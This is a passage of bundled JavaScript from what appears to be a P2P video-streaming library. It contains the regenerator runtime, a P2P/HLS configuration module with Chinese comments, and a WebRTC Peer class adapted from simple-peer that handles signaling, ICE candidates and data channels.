          if (record.arg === ContinueSentinel) {
            continue;
          }

          return {
            value: record.arg,
            done: context.done
          };
        } else if (record.type === "throw") {
          state = GenStateCompleted;
          // Dispatch the exception by looping back around to the
          // context.dispatchException(context.arg) call above.
          context.method = "throw";
          context.arg = record.arg;
        }
      }
    };
  }

  // Call delegate.iterator[context.method](context.arg) and handle the
  // result, either by returning a { value, done } result from the
  // delegate iterator, or by modifying context.method and context.arg,
  // setting context.delegate to null, and returning the ContinueSentinel.
  function maybeInvokeDelegate(delegate, context) {
    var method = delegate.iterator[context.method];
    if (method === undefined) {
      // A .throw or .return when the delegate iterator has no .throw
      // method always terminates the yield* loop.
      context.delegate = null;

      if (context.method === "throw") {
        if (delegate.iterator.return) {
          // If the delegate iterator has a return method, give it a
          // chance to clean up.
          context.method = "return";
          context.arg = undefined;
          maybeInvokeDelegate(delegate, context);

          if (context.method === "throw") {
            // If maybeInvokeDelegate(context) changed context.method from
            // "return" to "throw", let that override the TypeError below.
            return ContinueSentinel;
          }
        }

        context.method = "throw";
        context.arg = new TypeError("The iterator does not provide a 'throw' method");
      }

      return ContinueSentinel;
    }

    var record = tryCatch(method, delegate.iterator, context.arg);

    if (record.type === "throw") {
      context.method = "throw";
      context.arg = record.arg;
      context.delegate = null;
      return ContinueSentinel;
    }

    var info = record.arg;

    if (!info) {
      context.method = "throw";
      context.arg = new TypeError("iterator result is not an object");
      context.delegate = null;
      return ContinueSentinel;
    }

    if (info.done) {
      // Assign the result of the finished delegate to the temporary
      // variable specified by delegate.resultName (see delegateYield).
      context[delegate.resultName] = info.value;

      // Resume execution at the desired location (see delegateYield).
      context.next = delegate.nextLoc;

      // If context.method was "throw" but the delegate handled the
      // exception, let the outer generator proceed normally. If
      // context.method was "next", forget context.arg since it has been
      // "consumed" by the delegate iterator. If context.method was
      // "return", allow the original .return call to continue in the
      // outer generator.
      if (context.method !== "return") {
        context.method = "next";
        context.arg = undefined;
      }
    } else {
      // Re-yield the result returned by the delegate method.
      return info;
    }

    // The delegate iterator is finished, so forget it and continue with
    // the outer generator.
    context.delegate = null;
    return ContinueSentinel;
  }

  // Define Generator.prototype.{next,throw,return} in terms of the
  // unified ._invoke helper method.
  defineIteratorMethods(Gp);

  Gp[toStringTagSymbol] = "Generator";

  // A Generator should always return itself as the iterator object when the
  // @@iterator function is called on it. Some browsers' implementations of the
  // iterator prototype chain incorrectly implement this, causing the Generator
  // object to not be returned from this call. This ensures that doesn't happen.
  // See https://github.com/facebook/regenerator/issues/274 for more details.
  Gp[iteratorSymbol] = function () {
    return this;
  };

  Gp.toString = function () {
    return "[object Generator]";
  };

  function pushTryEntry(locs) {
    var entry = { tryLoc: locs[0] };

    if (1 in locs) {
      entry.catchLoc = locs[1];
    }

    if (2 in locs) {
      entry.finallyLoc = locs[2];
      entry.afterLoc = locs[3];
    }

    this.tryEntries.push(entry);
  }

  function resetTryEntry(entry) {
    var record = entry.completion || {};
    record.type = "normal";
    delete record.arg;
    entry.completion = record;
  }

  function Context(tryLocsList) {
    // The root entry object (effectively a try statement without a catch
    // or a finally block) gives us a place to store values thrown from
    // locations where there is no enclosing try statement.
    this.tryEntries = [{ tryLoc: "root" }];
    tryLocsList.forEach(pushTryEntry, this);
    this.reset(true);
  }

  runtime.keys = function (object) {
    var keys = [];
    for (var key in object) {
      keys.push(key);
    }
    keys.reverse();

    // Rather than returning an object with a next method, we keep
    // things simple and return the next function itself.
    return function next() {
      while (keys.length) {
        var key = keys.pop();
        if (key in object) {
          next.value = key;
          next.done = false;
          return next;
        }
      }

      // To avoid creating an additional object, we just hang the .value
      // and .done properties off the next function object itself. This
      // also ensures that the minifier will not anonymize the function.
      next.done = true;
      return next;
    };
  };

  function values(iterable) {
    if (iterable) {
      var iteratorMethod = iterable[iteratorSymbol];
      if (iteratorMethod) {
        return iteratorMethod.call(iterable);
      }

      if (typeof iterable.next === "function") {
        return iterable;
      }

      if (!isNaN(iterable.length)) {
        var i = -1,
            next = function next() {
          while (++i < iterable.length) {
            if (hasOwn.call(iterable, i)) {
              next.value = iterable[i];
              next.done = false;
              return next;
            }
          }

          next.value = undefined;
          next.done = true;

          return next;
        };

        return next.next = next;
      }
    }

    // Return an iterator with no values.
    return { next: doneResult };
  }
  runtime.values = values;

  function doneResult() {
    return { value: undefined, done: true };
  }

  Context.prototype = {
    constructor: Context,

    reset: function reset(skipTempReset) {
      this.prev = 0;
      this.next = 0;
      // Resetting context._sent for legacy support of Babel's
      // function.sent implementation.
      this.sent = this._sent = undefined;
      this.done = false;
      this.delegate = null;

      this.method = "next";
      this.arg = undefined;

      this.tryEntries.forEach(resetTryEntry);

      if (!skipTempReset) {
        for (var name in this) {
          // Not sure about the optimal order of these conditions:
          if (name.charAt(0) === "t" && hasOwn.call(this, name) && !isNaN(+name.slice(1))) {
            this[name] = undefined;
          }
        }
      }
    },

    stop: function stop() {
      this.done = true;

      var rootEntry = this.tryEntries[0];
      var rootRecord = rootEntry.completion;
      if (rootRecord.type === "throw") {
        throw rootRecord.arg;
      }

      return this.rval;
    },

    dispatchException: function dispatchException(exception) {
      if (this.done) {
        throw exception;
      }

      var context = this;
      function handle(loc, caught) {
        record.type = "throw";
        record.arg = exception;
        context.next = loc;

        if (caught) {
          // If the dispatched exception was caught by a catch block,
          // then let that catch block handle the exception normally.
          context.method = "next";
          context.arg = undefined;
        }

        return !!caught;
      }

      for (var i = this.tryEntries.length - 1; i >= 0; --i) {
        var entry = this.tryEntries[i];
        var record = entry.completion;

        if (entry.tryLoc === "root") {
          // Exception thrown outside of any try block that could handle
          // it, so set the completion value of the entire function to
          // throw the exception.
          return handle("end");
        }

        if (entry.tryLoc <= this.prev) {
          var hasCatch = hasOwn.call(entry, "catchLoc");
          var hasFinally = hasOwn.call(entry, "finallyLoc");

          if (hasCatch && hasFinally) {
            if (this.prev < entry.catchLoc) {
              return handle(entry.catchLoc, true);
            } else if (this.prev < entry.finallyLoc) {
              return handle(entry.finallyLoc);
            }
          } else if (hasCatch) {
            if (this.prev < entry.catchLoc) {
              return handle(entry.catchLoc, true);
            }
          } else if (hasFinally) {
            if (this.prev < entry.finallyLoc) {
              return handle(entry.finallyLoc);
            }
          } else {
            throw new Error("try statement without catch or finally");
          }
        }
      }
    },

    abrupt: function abrupt(type, arg) {
      for (var i = this.tryEntries.length - 1; i >= 0; --i) {
        var entry = this.tryEntries[i];
        if (entry.tryLoc <= this.prev && hasOwn.call(entry, "finallyLoc") && this.prev < entry.finallyLoc) {
          var finallyEntry = entry;
          break;
        }
      }

      if (finallyEntry && (type === "break" || type === "continue") && finallyEntry.tryLoc <= arg && arg <= finallyEntry.finallyLoc) {
        // Ignore the finally entry if control is not jumping to a
        // location outside the try/catch block.
        finallyEntry = null;
      }

      var record = finallyEntry ? finallyEntry.completion : {};
      record.type = type;
      record.arg = arg;

      if (finallyEntry) {
        this.method = "next";
        this.next = finallyEntry.finallyLoc;
        return ContinueSentinel;
      }

      return this.complete(record);
    },

    complete: function complete(record, afterLoc) {
      if (record.type === "throw") {
        throw record.arg;
      }

      if (record.type === "break" || record.type === "continue") {
        this.next = record.arg;
      } else if (record.type === "return") {
        this.rval = this.arg = record.arg;
        this.method = "return";
        this.next = "end";
      } else if (record.type === "normal" && afterLoc) {
        this.next = afterLoc;
      }

      return ContinueSentinel;
    },

    finish: function finish(finallyLoc) {
      for (var i = this.tryEntries.length - 1; i >= 0; --i) {
        var entry = this.tryEntries[i];
        if (entry.finallyLoc === finallyLoc) {
          this.complete(entry.completion, entry.afterLoc);
          resetTryEntry(entry);
          return ContinueSentinel;
        }
      }
    },

    "catch": function _catch(tryLoc) {
      for (var i = this.tryEntries.length - 1; i >= 0; --i) {
        var entry = this.tryEntries[i];
        if (entry.tryLoc === tryLoc) {
          var record = entry.completion;
          if (record.type === "throw") {
            var thrown = record.arg;
            resetTryEntry(entry);
          }
          return thrown;
        }
      }

      // The context.catch method must only be called with a location
      // argument that corresponds to a known catch block.
      throw new Error("illegal catch attempt");
    },

    delegateYield: function delegateYield(iterable, resultName, nextLoc) {
      this.delegate = {
        iterator: values(iterable),
        resultName: resultName,
        nextLoc: nextLoc
      };

      if (this.method === "next") {
        // Deliberately forget the last sent value so that we don't
        // accidentally pass it on to the delegate.
        this.arg = undefined;
      }

      return ContinueSentinel;
    }
  };
}(
// In sloppy mode, unbound `this` refers to the global object, fallback to
// Function constructor if we're in global strict mode. That is sadly a form
// of indirect eval which violates Content Security Policy.
function () {
  return this;
}() || Function("return this")());
/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(11)(module)))

/***/ }),
/* 21 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.defaultPloxyConfig = exports.defaultP2PConfig = undefined;

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _core = __webpack_require__(5);

//时间单位统一为秒
var defaultP2PConfig = _extends({}, _core.config, {

    swFile: 'sw.js', // service worker文件路径
    swScope: './', // service worker作用范围
    httpLoadTime: 2.0, // 需要保留给http下载的时间
    nativePlaybackOnly: false
});

// 获取segment Id的函数
defaultP2PConfig.segmentId = function (streamId, sn, segmentUrl, range) {
    var netUrl = segmentUrl.split('?')[0];
    if (netUrl.startsWith('http')) {
        netUrl = netUrl.split('://')[1];
    }
    if (range) {
        return netUrl + '|' + range;
    }
    return '' + netUrl;
};

var defaultPloxyConfig = {
    mediaFileLoadTimeout: 4500, // ms
    // mediaFileLoadTimeout: 10000,        // ms
    version: 1, // 发布版本号
    logLevel: 'error',
    hlsMediaFiles: ['ts', 'mp4', 'm4s'] // 允许P2P的文件后缀
};

exports.defaultP2PConfig = defaultP2PConfig;
exports.defaultPloxyConfig = defaultPloxyConfig;

/***/ }),
/* 22 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _toolFuns = __webpack_require__(0);

var _events = __webpack_require__(1);

var _events2 = _interopRequireDefault(_events);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var queueMicrotask = __webpack_require__(12);
// const errCode = require('./utils/err-code')
var Buffer = __webpack_require__(3).Buffer;

var MAX_BUFFERED_AMOUNT = 64 * 1024;
var ICECOMPLETE_TIMEOUT = 5 * 1000;
var CHANNEL_CLOSING_TIMEOUT = 5 * 1000;

// HACK: Filter trickle lines when trickle is disabled #354
function filterTrickle(sdp) {
    return sdp.replace(/a=ice-options:trickle\s\n/g, '');
    // return sdp
}

function warn(message) {
    console.warn(message);
}

/**
 * WebRTC peer connection. Same API as node core `net.Socket`, plus a few extra methods.
 * Duplex stream.
 * @param {Object} opts
 */

var Peer = function (_EventEmitter) {
    _inherits(Peer, _EventEmitter);

    function Peer(opts) {
        _classCallCheck(this, Peer);

        // this._id = randombytes(4).toString('hex').slice(0, 7)

        // this._debug('new peer %o', opts)

        var _this = _possibleConstructorReturn(this, (Peer.__proto__ || Object.getPrototypeOf(Peer)).call(this));
        // opts = Object.assign({
        //     allowHalfOpen: false
        // }, opts)

        _this.channelName = opts.initiator ? opts.channelName : null;
        // console.warn(`peer-channel channelName ${this.channelName}`)

        _this.initiator = opts.initiator || false;
        _this.channelConfig = opts.channelConfig || Peer.channelConfig;
        _this.channelNegotiated = _this.channelConfig.negotiated;
        // console.warn(Peer.config)
        // console.warn(opts.config)
        _this.config = Object.assign({}, Peer.config, opts.config);
        // warn(JSON.stringify(this.config));
        _this.offerOptions = opts.offerOptions || {};
        _this.answerOptions = opts.answerOptions || {};
        _this.sdpTransform = opts.sdpTransform || function (sdp) {
            return sdp;
        };
        // this.streams = opts.streams || (opts.stream ? [opts.stream] : []) // support old "stream" option
        _this.trickle = opts.trickle !== undefined ? opts.trickle : true;
        _this.allowHalfTrickle = opts.allowHalfTrickle !== undefined ? opts.allowHalfTrickle : false;
        _this.iceCompleteTimeout = opts.iceCompleteTimeout || ICECOMPLETE_TIMEOUT;

        _this.destroyed = false;
        _this.destroying = false;
        _this._connected = false;

        _this.remoteAddress = undefined;
        _this.remoteFamily = undefined;
        _this.remotePort = undefined;
        _this.localAddress = undefined;
        _this.localFamily = undefined;
        _this.localPort = undefined;

        _this._wrtc = opts.wrtc && _typeof(opts.wrtc) === 'object' ? opts.wrtc : (0, _toolFuns.getBrowserRTC)();

        // if (!this._wrtc) {
        //     if (typeof window === 'undefined') {
        //         throw errCode(new Error('No WebRTC support: Specify `opts.wrtc` option in this environment'), 'ERR_WEBRTC_SUPPORT')
        //     } else {
        //         throw errCode(new Error('No WebRTC support: Not a supported browser'), 'ERR_WEBRTC_SUPPORT')
        //     }
        // }

        _this._pcReady = false;
        _this._channelReady = false;
        _this._iceComplete = false; // ice candidate trickle done (got null candidate)
        _this._iceCompleteTimer = null; // send an offer/answer anyway after some timeout
        _this._channel = null;
        _this._pendingCandidates = [];

        _this._isNegotiating = false; // is this peer waiting for negotiation to complete?
        _this._firstNegotiation = true;
        _this._batchedNegotiation = false; // batch synchronous negotiations
        _this._queuedNegotiation = false; // is there a queued negotiation request?
        _this._sendersAwaitingStable = [];
        _this._senderMap = new Map();
        _this._closingInterval = null;

        _this._remoteTracks = [];
        _this._remoteStreams = [];

        _this._chunk = null;
        _this._cb = null;
        _this._interval = null;

        try {
            _this._pc = new _this._wrtc.RTCPeerConnection(_this.config);
        } catch (err) {
            queueMicrotask(function () {
                return _this.destroy(err);
            });
            return _possibleConstructorReturn(_this);
        }

        // We prefer feature detection whenever possible, but sometimes that's not
        // possible for certain implementations.
        _this._isReactNativeWebrtc = typeof _this._pc._peerConnectionId === 'number';

        _this._pc.oniceconnectionstatechange = function () {
            _this._onIceStateChange();
        };
        _this._pc.onicegatheringstatechange = function () {
            _this._onIceStateChange();
        };
        _this._pc.onconnectionstatechange = function () {
            _this._onConnectionStateChange();
        };
        _this._pc.onsignalingstatechange = function () {
            _this._onSignalingStateChange();
        };
        _this._pc.onicecandidate = function (event) {
            _this._onIceCandidate(event);
        };

        // Other spec events, unused by this implementation:
        // - onconnectionstatechange
        // - onicecandidateerror
        // - onfingerprintfailure
        // - onnegotiationneeded

        if (_this.initiator || _this.channelNegotiated) {
            _this._setupData({
                channel: _this._pc.createDataChannel(_this.channelName, _this.channelConfig)
            });
        } else {
            _this._pc.ondatachannel = function (event) {
                _this._setupData(event);
            };
        }

        // if (this.streams) {
        //     this.streams.forEach(stream => {
        //         this.addStream(stream)
        //     })
        // }
        // this._pc.ontrack = event => {
        //     this._onTrack(event)
        // }

        // this._debug('initial negotiation')
        _this._needsNegotiation();

        // this._onFinishBound = () => {
        //     this._onFinish()
        // }
        // this.once('finish', this._onFinishBound)
        return _this;
    }

    _createClass(Peer, [{
        key: 'signal',


        // address () {
        //     return { port: this.localPort, family: this.localFamily, address: this.localAddress }
        // }

        value: function signal(data) {
            var _this2 = this;

            if (this.destroyed) throw new Error('cannot signal after peer is destroyed');
            if (typeof data === 'string') {
                try {
                    data = JSON.parse(data);
                } catch (err) {
                    data = {};
                }
            }
            // this._debug('signal()')

            if (data.renegotiate && this.initiator) {
                // this._debug('got request to renegotiate')
                this._needsNegotiation();
            }
            if (data.transceiverRequest && this.initiator) {
                // this._debug('got request for transceiver')
                this.addTransceiver(data.transceiverRequest.kind, data.transceiverRequest.init);
            }
            if (data.candidate) {
                if (this._pc.remoteDescription && this._pc.remoteDescription.type) {
                    this._addIceCandidate(data.candidate);
                } else {
                    this._pendingCandidates.push(data.candidate);
                }
            }
            if (data.sdp) {
                this._pc.setRemoteDescription(new this._wrtc.RTCSessionDescription(data)).then(function () {
                    if (_this2.destroyed) return;

                    _this2._pendingCandidates.forEach(function (candidate) {
                        _this2._addIceCandidate(candidate);
                    });
                    _this2._pendingCandidates = [];

                    if (_this2._pc.remoteDescription.type === 'offer') _this2._createAnswer();
                }).catch(function (err) {
                    _this2.destroy(err);
                });
            }
            if (!data.sdp && !data.candidate && !data.renegotiate && !data.transceiverRequest) {
                this.destroy(new Error('signal() called with invalid signal data'));
            }
        }
    }, {
        key: '_addIceCandidate',
        value: function _addIceCandidate(candidate) {
            var _this3 = this;

            var iceCandidateObj = new this._wrtc.RTCIceCandidate(candidate);
            this._pc.addIceCandidate(iceCandidateObj).catch(function (err) {
                if (!iceCandidateObj.address || iceCandidateObj.address.endsWith('.local')) {
                    warn('Ignoring unsupported ICE candidate.');
                } else {
                    _this3.destroy(err);
                }
            });
        }

        /**
         * Send text/binary data to the remote peer.
         * @param {ArrayBufferView|ArrayBuffer|Buffer|string|Blob} chunk
         */

    }, {
        key: 'send',
        value: function send(chunk) {
            this._channel.send(chunk);
        }

        /**
         * Add a Transceiver to the connection.
         * @param {String} kind
         * @param {Object} init
         */

    }, {
        key: 'addTransceiver',
        value: function addTransceiver(kind, init) {
            // this._debug('addTransceiver()')

            if (this.initiator) {
                try {
                    this._pc.addTransceiver(kind, init);
                    this._needsNegotiation();
                } catch (err) {
                    this.destroy(err);
                }
            } else {
                this.emit('signal', { // request initiator to renegotiate
                    type: 'transceiverRequest',
                    transceiverRequest: { kind: kind, init: init }
                });
            }
        }

        /**
         * Add a MediaStream to the connection.
         * @param {MediaStream} stream
         */
        // addStream (stream) {
        //     // this._debug('addStream()')
        //
        //     stream.getTracks().forEach(track => {
        //         this.addTrack(track, stream)
        //     })
        // }

        /**
         * Add a MediaStreamTrack to the connection.
         * @param {MediaStreamTrack} track
         * @param {MediaStream} stream
         */
        // addTrack (track, stream) {
        //     // this._debug('addTrack()')
        //
        //     const submap = this._senderMap.get(track) || new Map() // nested Maps map [track, stream] to sender
        //     let sender = submap.get(stream)
        //     if (!sender) {
        //         sender = this._pc.addTrack(track, stream)
        //         submap.set(stream, sender)
        //         this._senderMap.set(track, submap)
        //         this._needsNegotiation()
        //     } else if (sender.removed) {
        //         throw errCode(new Error('Track has been removed. You should enable/disable tracks that you want to re-add.'), 'ERR_SENDER_REMOVED')
        //     } else {
        //         throw errCode(new Error('Track has already been added to that stream.'), 'ERR_SENDER_ALREADY_ADDED')
        //     }
        // }

        /**
         * Replace a MediaStreamTrack by another in the connection.
         * @param {MediaStreamTrack} oldTrack
         * @param {MediaStreamTrack} newTrack
         * @param {MediaStream} stream
         */
        // replaceTrack (oldTrack, newTrack, stream) {
        //     // this._debug('replaceTrack()')
        //
        //     const submap = this._senderMap.get(oldTrack)
        //     const sender = submap ? submap.get(stream) : null
        //     if (!sender) {
        //         throw errCode(new Error('Cannot replace track that was never added.'), 'ERR_TRACK_NOT_ADDED')
        //     }
        //     if (newTrack) this._senderMap.set(newTrack, submap)
        //
        //     if (sender.replaceTrack != null) {
        //         sender.replaceTrack(newTrack)
        //     } else {
        //         this.destroy(errCode(new Error('replaceTrack is not supported in this browser'), 'ERR_UNSUPPORTED_REPLACETRACK'))
        //     }
        // }

        /**
         * Remove a MediaStreamTrack from the connection.
         * @param {MediaStreamTrack} track
         * @param {MediaStream} stream
         */
        // removeTrack (track, stream) {
        //     // this._debug('removeSender()')
        //
        //     const submap = this._senderMap.get(track)
        //     const sender = submap ? submap.get(stream) : null
        //     if (!sender) {
        //         throw errCode(new Error('Cannot remove track that was never added.'), 'ERR_TRACK_NOT_ADDED')
        //     }
        //     try {
        //         sender.removed = true
        //         this._pc.removeTrack(sender)
        //     } catch (err) {
        //         if (err.name === 'NS_ERROR_UNEXPECTED') {
        //             this._sendersAwaitingStable.push(sender) // HACK: Firefox must wait until (signalingState === stable) https://bugzilla.mozilla.org/show_bug.cgi?id=1133874
        //         } else {
        //             this.destroy(errCode(err, 'ERR_REMOVE_TRACK'))
        //         }
        //     }
        //     this._needsNegotiation()
        // }

        /**
         * Remove a MediaStream from the connection.
         * @param {MediaStream} stream
         */
        // removeStream (stream) {
        //     // this._debug('removeSenders()')
        //
        //     stream.getTracks().forEach(track => {
        //         this.removeTrack(track, stream)
        //     })
        // }

    }, {
        key: '_needsNegotiation',
        value: function _needsNegotiation() {
            var _this4 = this;

            // this._debug('_needsNegotiation')
            if (this._batchedNegotiation) return; // batch synchronous renegotiations
            this._batchedNegotiation = true;
            queueMicrotask(function () {
                _this4._batchedNegotiation = false;
                if (_this4.initiator || !_this4._firstNegotiation) {
                    // this._debug('starting batched negotiation')
                    _this4.negotiate();
                } else {
                    // this._debug('non-initiator initial negotiation request discarded')
                }
                _this4._firstNegotiation = false;
            });
        }
    }, {
        key: 'negotiate',
        value: function negotiate() {
            var _this5 = this;

            if (this.initiator) {
                if (this._isNegotiating) {
                    this._queuedNegotiation = true;
                    // this._debug('already negotiating, queueing')
                } else {
                    // this._debug('start negotiation')
                    setTimeout(function () {
                        // HACK: Chrome crashes if we immediately call createOffer
                        _this5._createOffer();
                    }, 0);
                }
            } else {
                if (this._isNegotiating) {
                    this._queuedNegotiation = true;
                    // this._debug('already negotiating, queueing')
                } else {
                    // this._debug('requesting negotiation from initiator')
                    this.emit('signal', { // request initiator to renegotiate
                        type: 'renegotiate',
                        renegotiate: true
                    });
                }
            }
            this._isNegotiating = true;
        }

        // TODO: Delete this method once readable-stream is updated to contain a default
        // implementation of destroy() that automatically calls _destroy()
        // See: https://github.com/nodejs/readable-stream/issues/283

    }, {
        key: 'destroy',
        value: function destroy(err) {
            this._destroy(err, function () {});
        }
    }, {
        key: '_destroy',
        value: function _destroy(err, cb) {
            var _this6 = this;

            if (this.destroyed || this.destroying) return;
            this.destroying = true;

            // this._debug('destroying (error: %s)', err && (err.message || err))

            queueMicrotask(function () {
                // allow events concurrent with the call to _destroy() to fire (see #692)
                _this6.destroyed = true;
                _this6.destroying = false;

                // this._debug('destroy (error: %s)', err && (err.message || err))

                // this.readable = this.writable = false

                // if (!this._readableState.ended) this.push(null)
                // if (!this._writableState.finished) this.end()

                _this6._connected = false;
                _this6._pcReady = false;
                _this6._channelReady = false;
                _this6._remoteTracks = null;
                _this6._remoteStreams = null;
                _this6._senderMap = null;

                clearInterval(_this6._closingInterval);
                _this6._closingInterval = null;

                clearInterval(_this6._interval);
                _this6._interval = null;
                _this6._chunk = null;
                _this6._cb = null;

                // if (this._onFinishBound) this.removeListener('finish', this._onFinishBound)
                // this._onFinishBound = null

                if (_this6._channel) {
                    try {
                        _this6._channel.close();
                    } catch (err) {}

                    // allow events concurrent with destruction to be handled
                    _this6._channel.onmessage = null;
                    _this6._channel.onopen = null;
                    _this6._channel.onclose = null;
                    _this6._channel.onerror = null;
                }
                if (_this6._pc) {
                    try {
                        _this6._pc.close();
                    } catch (err) {}

                    // allow events concurrent with destruction to be handled
                    _this6._pc.oniceconnectionstatechange = null;
                    _this6._pc.onicegatheringstatechange = null;
                    _this6._pc.onsignalingstatechange = null;
                    _this6._pc.onicecandidate = null;
                    _this6._pc.ontrack = null;
                    _this6._pc.ondatachannel = null;
                }
                _this6._pc = null;
                _this6._channel = null;

                if (err) _this6.emit('error', err);
                _this6.emit('close');
                // cb()
            });
        }
    }, {
        key: '_setupData',
        value: function _setupData(event) {
            var _this7 = this;

            if (!event.channel) {
                // In some situations `pc.createDataChannel()` returns `undefined` (in wrtc),
                // which is invalid behavior. Handle it gracefully.
                // See: https://github.com/feross/simple-peer/issues/163
                return this.destroy(new Error('Data channel event is missing `channel` property'));
            }

            this._channel = event.channel;
            this._channel.binaryType = 'arraybuffer';

            if (typeof this._channel.bufferedAmountLowThreshold === 'number') {
                this._channel.bufferedAmountLowThreshold = MAX_BUFFERED_AMOUNT;
            }

            this.channelName = this._channel.label;

            this._channel.onmessage = function (event) {
                _this7._onChannelMessage(event);
            };
            this._channel.onbufferedamountlow = function () {
                _this7._onChannelBufferedAmountLow();
            };
            this._channel.onopen = function () {
                _this7._onChannelOpen();
            };
            this._channel.onclose = function () {
                _this7._onChannelClose();
            };
            this._channel.onerror = function (err) {
                _this7.destroy(err);
            };

            // HACK: Chrome will sometimes get stuck in readyState "closing", let's check for this condition
            // https://bugs.chromium.org/p/chromium/issues/detail?id=882743
            var isClosing = false;
            this._closingInterval = setInterval(function () {
                // No "onclosing" event
                if (_this7._channel && _this7._channel.readyState === 'closing') {
                    if (isClosing) _this7._onChannelClose(); // closing timed out: equivalent to onclose firing
                    isClosing = true;
                } else {
                    isClosing = false;
                }
            }, CHANNEL_CLOSING_TIMEOUT);
        }

        // _read () {}

        // _write (chunk, encoding, cb) {
        //     if (this.destroyed) return cb(errCode(new Error('cannot write after peer is destroyed'), 'ERR_DATA_CHANNEL'))
        //
        //     if (this._connected) {
        //         try {
        //             this.send(chunk)
        //         } catch (err) {
        //             return this.destroy(errCode(err, 'ERR_DATA_CHANNEL'))
        //         }
        //         if (this._channel.bufferedAmount > MAX_BUFFERED_AMOUNT) {
        //             // this._debug('start backpressure: bufferedAmount %d', this._channel.bufferedAmount)
        //             this._cb = cb
        //         } else {
        //             cb(null)
        //         }
        //     } else {
        //         // this._debug('write before connect')
        //         this._chunk = chunk
        //         this._cb = cb
        //     }
        // }

        // When stream finishes writing, close socket. Half open connections are not
        // supported.
        // _onFinish () {
        //     if (this.destroyed) return
        //
        //     // Wait a bit before destroying so the socket flushes.
        //     // TODO: is there a more reliable way to accomplish this?
        //     const destroySoon = () => {
        //         setTimeout(() => this.destroy(), 1000)
        //     }
        //
        //     if (this._connected) {
        //         destroySoon()
        //     } else {
        //         this.once('connect', destroySoon)
        //     }
        // }

    }, {
        key: '_startIceCompleteTimeout',
        value: function _startIceCompleteTimeout() {
            var _this8 = this;

            if (this.destroyed) return;
            if (this._iceCompleteTimer) return;
            // this._debug('started iceComplete timeout')
            this._iceCompleteTimer = setTimeout(function () {
                if (!_this8._iceComplete) {
                    _this8._iceComplete = true;
                    // this._debug('iceComplete timeout completed')
                    _this8.emit('iceTimeout');
                    // console.warn(`emit _iceComplete ${new Date()}`)
                    _this8.emit('_iceComplete');
                }
            }, this.iceCompleteTimeout);
        }
    }, {
        key: '_createOffer',
        value: function _createOffer() {
            var _this9 = this;

            if (this.destroyed) return;

            this._pc.createOffer(this.offerOptions).then(function (offer) {
                if (_this9.destroyed) return;
                if (!_this9.trickle && !_this9.allowHalfTrickle) offer.sdp = filterTrickle(offer.sdp);
                offer.sdp = _this9.sdpTransform(offer.sdp);
                // console.warn(`createOffer sdp ${offer.sdp}`)
                var sendOffer = function sendOffer() {
                    if (_this9.destroyed) return;
                    // console.warn(`sendOffer localDescription ${this._pc.localDescription.sdp} ${new Date()}`)
                    // console.warn(`sendOffer offer ${offer.sdp}`)
                    var signal = _this9._pc.localDescription || offer;
                    // this._debug('signal')
                    _this9.emit('signal', {
                        type: signal.type,
                        sdp: signal.sdp
                    });
                };

                var onSuccess = function onSuccess() {
                    // this._debug('createOffer success')
                    if (_this9.destroyed) return;
                    if (_this9.trickle || _this9._iceComplete) sendOffer();else _this9.once('_iceComplete', sendOffer); // wait for candidates
                };

                var onError = function onError(err) {
                    _this9.destroy(err);
                };

                _this9._pc.setLocalDescription(offer).then(onSuccess).catch(onError);
            }).catch(function (err) {
                _this9.destroy(err);
            });
        }
    }, {
        key: '_requestMissingTransceivers',
        value: function _requestMissingTransceivers() {
            var _this10 = this;

            if (this._pc.getTransceivers) {
                this._pc.getTransceivers().forEach(function (transceiver) {
                    if (!transceiver.mid && transceiver.sender.track && !transceiver.requested) {
                        transceiver.requested = true; // HACK: Safari returns negotiated transceivers with a null mid
                        _this10.addTransceiver(transceiver.sender.track.kind);
                    }
                });
            }
        }
    }, {
        key: '_createAnswer',
        value: function _createAnswer() {
            var _this11 = this;

            if (this.destroyed) return;

            this._pc.createAnswer(this.answerOptions).then(function (answer) {
                if (_this11.destroyed) return;
                if (!_this11.trickle && !_this11.allowHalfTrickle) answer.sdp = filterTrickle(answer.sdp);
                answer.sdp = _this11.sdpTransform(answer.sdp);
                // console.warn(`createAnswer sdp ${answer.sdp}`)
                var sendAnswer = function sendAnswer() {
                    if (_this11.destroyed) return;
                    // console.warn(`sendAnswer localDescription ${this._pc.localDescription.sdp} ${new Date()}`)
                    // console.warn(`sendAnswer answer ${answer.sdp}`)
                    var signal = _this11._pc.localDescription || answer;
                    // this._debug('signal')
                    _this11.emit('signal', {
                        type: signal.type,
                        sdp: signal.sdp
                    });
                    if (!_this11.initiator) _this11._requestMissingTransceivers();
                };

                var onSuccess = function onSuccess() {
                    if (_this11.destroyed) return;
                    if (_this11.trickle || _this11._iceComplete) sendAnswer();else _this11.once('_iceComplete', sendAnswer);
                };

                var onError = function onError(err) {
                    _this11.destroy(err);
